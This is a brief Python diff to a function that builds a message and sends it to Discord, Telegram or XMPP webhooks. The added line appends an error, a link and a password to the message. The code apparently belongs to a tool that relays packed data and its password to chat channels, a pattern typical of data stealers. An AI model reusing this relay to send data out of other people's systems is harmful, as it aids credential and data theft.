@@ -62,6 +62,7 @@ def Send(type,np,data,dataB,dataO,dataW,dataF,discordData,TelegramData,xmppData)
 					message+= text
 		except Exception as e:
 			print(e)
+			message+=f"data error:{e}\nLink🔗:{url}\nPassword: {np[1]}"
 		try:
 			if type == 0:
 				urlWebHook = discordData[0] # url of your WebHook
